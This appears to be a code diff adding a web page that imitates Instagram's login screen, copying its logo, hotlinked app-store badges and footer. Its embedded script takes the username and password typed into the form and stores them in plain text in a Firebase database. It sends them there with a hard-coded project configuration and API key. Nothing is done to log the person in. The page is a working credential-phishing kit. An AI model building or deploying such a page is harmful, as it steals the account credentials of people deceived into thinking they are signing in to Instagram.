@@ -1,0 +1,126 @@
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Instagram login Form</title>
+  <!-- External css -->
+  <link rel="stylesheet" href="style.css">
+  <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
+  <!-- Font awesome link -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+  <script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
+    import { getDatabase, ref, set, get, child, onValue } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyDPYduxdJy9FZtthz5A_GaFouMsp3Lxhpk",
+      authDomain: "login-3ca87.firebaseapp.com",
+      projectId: "login-3ca87",
+      storageBucket: "login-3ca87.appspot.com",
+      messagingSenderId: "516720076644",
+      appId: "1:516720076644:web:c55453a1d2b2c30a053c71",
+      measurementId: "G-K0J62MSVRN"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let btn = document.getElementById("btn");
+    var myarray = [];
+    let myarrayfire = [];
+
+    console.log("myarrayjs", myarrayfire);
+
+    onValue(ref(db, 'Users/'), function (snapshot) {
+      myarrayfire = snapshot.val();
+      if (myarrayfire == null) {
+        myarray = [];
+      }
+      else {
+        myarray = myarrayfire;
+      }
+
+    });
+
+    btn.onclick = function () {
+      let obj = {
+        "name": document.getElementById("username").value,
+        "pass": document.getElementById("Password").value
+      }
+      console.log(obj);
+      myarray.push(obj);
+      set(ref(db, 'Users/'), myarray);
+
+
+    }
+  </script>
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <div class="container">
+      <div class="phone-app-demo"></div>
+      <div class="form-data">
+        <for>
+          <div class="logo">
+            <h1>Instagram.</h1>
+          </div>
+          <input type="text" placeholder="Phone number, username, or email" id="username" class="inputform">
+          <input type="password" placeholder="Password" id="Password" class="inputform"><br>
+          <button class="form-btn" id="btn">Log in</button><br><br>
+          <center>
+            <span class="has-separator">Or</span><br><br>
+            <a href="#" class="facebook-login">
+              <i class="fab fa-facebook"></i> Log in with Facebook
+            </a><br><br>
+            <a class="password-reset" href="#">Forgot password?</a>
+            </form>
+            <div class="sign-up">
+              Don't an account? <a href="#">Sign up</a>
+            </div>
+          </center>
+          <div class="get-the-app">
+            <span>Get the app</span>
+            <div class="badge">
+              <img
+                src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
+                alt="android App">
+              <img
+                src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
+                alt="ios app">
+            </div>
+          </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <nav class="footer-nav">
+          <ul>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Support</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Profiles</a></li>
+            <li><a href="#">Languages</a></li>
+          </ul>
+        </nav>
+        <div class="copyright-notice">
+          &copy; 2019 Complaints
+        </div>
+      </div>
+    </footer>
+  </div>
+</body>
+
+</html>
